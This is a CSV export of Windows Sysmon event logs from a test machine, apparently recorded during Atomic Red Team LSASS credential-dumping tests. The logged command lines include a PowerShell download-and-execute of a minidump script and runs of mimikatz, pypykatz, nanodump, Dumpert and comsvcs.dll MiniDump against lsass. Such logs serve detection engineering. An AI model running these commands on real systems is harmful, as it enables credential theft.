Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,22,19554,,,<unknown process>,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-4689-658c-aa01-000000000f00},3588,4824,,,github.com,::ffff:140.82.121.4;,0,-,,,,,,2023-12-27T15:45:16.6621789Z,,22,,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:49:28.658,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>22</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>22</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:16.6621789Z""/>
      
            
      <EventRecordID>19554</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 14:49:28.658</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4689-658c-aa01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">4824</Data>
      
            
      <Data Name=""QueryName"">github.com</Data>
      
            
      <Data Name=""QueryStatus"">0</Data>
      
            
      <Data Name=""QueryResults"">::ffff:140.82.121.4;</Data>
      
            
      <Data Name=""Image"">&lt;unknown process&gt;</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 15:45:16.266,,,,,,,,11,19553,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-4689-658c-aa01-000000000f00},3588,4824,,,,,,-,,,,,,2023-12-27T15:45:16.2805536Z,C:\Users\User\AppData\Local\Temp\lsass_804.dmp,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:16.266,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:16.2805536Z""/>
      
            
      <EventRecordID>19553</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:16.266</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4689-658c-aa01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">4824</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\lsass_804.dmp</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 15:45:16.266</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,lb-140-82-121-4-fra.github.com,140.82.121.4,false,443,https,3,19552,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,true,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-4689-658c-aa01-000000000f00},3588,4824,,tcp,,,,-,WinDev2309Eval.localdomain,192.168.126.163,false,49969,-,2023-12-27T15:45:15.7465400Z,,3,,5136,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:49:28.666,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>3</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>3</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:15.7465400Z""/>
      
            
      <EventRecordID>19552</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5136""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 14:49:28.666</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4689-658c-aa01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">4824</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""Protocol"">tcp</Data>
      
            
      <Data Name=""Initiated"">true</Data>
      
            
      <Data Name=""SourceIsIpv6"">false</Data>
      
            
      <Data Name=""SourceIp"">192.168.126.163</Data>
      
            
      <Data Name=""SourceHostname"">WinDev2309Eval.localdomain</Data>
      
            
      <Data Name=""SourcePort"">49969</Data>
      
            
      <Data Name=""SourcePortName"">-</Data>
      
            
      <Data Name=""DestinationIsIpv6"">false</Data>
      
            
      <Data Name=""DestinationIp"">140.82.121.4</Data>
      
            
      <Data Name=""DestinationHostname"">lb-140-82-121-4-fra.github.com</Data>
      
            
      <Data Name=""DestinationPort"">443</Data>
      
            
      <Data Name=""DestinationPortName"">https</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 15:45:13.508,,,,,,,,11,19551,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-4689-658c-aa01-000000000f00},3588,4824,,,,,,-,,,,,,2023-12-27T15:45:13.5230740Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_tqfjnov5.paf.ps1,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:13.508,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:13.5230740Z""/>
      
            
      <EventRecordID>19551</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:13.508</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4689-658c-aa01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">4824</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_tqfjnov5.paf.ps1</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 15:45:13.508</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\\"""" -ErrorAction Ignore -Force | Out-Null
try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}
catch{ $_; exit $_.Exception.Response.StatusCode.Value__}
get-process lsass | Out-Minidump}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19550,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-4689-658c-aa01-000000000f00},3588,4824,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:45:13.4152165Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:13.414,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:13.4152165Z""/>
      
            
      <EventRecordID>19550</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:13.414</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4689-658c-aa01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">4824</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows PowerShell</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
            
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory \""""C:\AtomicRedTeam\atomics\..\ExternalPayloads\\"""" -ErrorAction Ignore -Force | Out-Null
try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}
catch{ $_; exit $_.Exception.Response.StatusCode.Value__}
get-process lsass | Out-Minidump}</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c pypykatz live lsa",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,,,,,,1,19549,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-4689-658c-a801-000000000f00},3588,2996,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:45:13.2001178Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:13.199,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:13.2001178Z""/>
      
            
      <EventRecordID>19549</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:13.199</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4689-658c-a801-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">2996</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows Command Processor</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      
            
      <Data Name=""CommandLine"">""cmd.exe"" /c pypykatz live lsa</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\x64\mimikatz.exe"" ""sekurlsa::minidump %%tmp%%\lsass.DMP"" ""sekurlsa::logonpasswords full"" exit",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,,,,,,1,19548,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-4688-658c-a601-000000000f00},3588,7664,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:45:12.9882590Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:12.987,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:12.9882590Z""/>
      
            
      <EventRecordID>19548</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:12.987</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4688-658c-a601-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">7664</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows Command Processor</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      
            
      <Data Name=""CommandLine"">""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\x64\mimikatz.exe"" ""sekurlsa::minidump %%tmp%%\lsass.DMP"" ""sekurlsa::logonpasswords full"" exit</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\nanodump.x64.exe -w ""%%temp%%\nanodump.dmp""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,,,,,,1,19547,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-4688-658c-a401-000000000f00},3588,10308,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:45:12.7470147Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:12.745,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:12.7470147Z""/>
      
            
      <EventRecordID>19547</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:12.745</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4688-658c-a401-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10308</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows Command Processor</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      
            
      <Data Name=""CommandLine"">""cmd.exe"" /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\nanodump.x64.exe -w ""%%temp%%\nanodump.dmp""</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\Outflank-Dumpert.exe""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,,,,,,1,19546,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-4688-658c-a201-000000000f00},3588,832,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:45:12.5346955Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:12.533,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:12.5346955Z""/>
      
            
      <EventRecordID>19546</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:12.533</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4688-658c-a201-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">832</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows Command Processor</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      
            
      <Data Name=""CommandLine"">""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\Outflank-Dumpert.exe""</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\System32\rundll32.exe"" C:\windows\System32\comsvcs.dll MiniDump 804 C:\Users\User\AppData\Local\Temp\lsass-comsvcs.dmp full",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows host process (Rundll32),,,,,,1,19545,10.0.22621.1 (WinBuild.160101.0800),"MD5=57A6B4BDF247C1A6CA08AC09A8F9B742,SHA256=98D37EFF504A7ADB864131EA4A042AAF4D79C4356960A8AB2FA656CC59AEC014,IMPHASH=5C68DE198B5D2DD5C1129782AD19676C",C:\Windows\System32\rundll32.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,RUNDLL32.EXE,"""powershell.exe"" & {C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-4686-658c-9f01-000000000f00},10608,WINDEV2309EVAL\User,{f57bd86a-4688-658c-a101-000000000f00},3588,8248,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:45:12.2245870Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:12.223,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
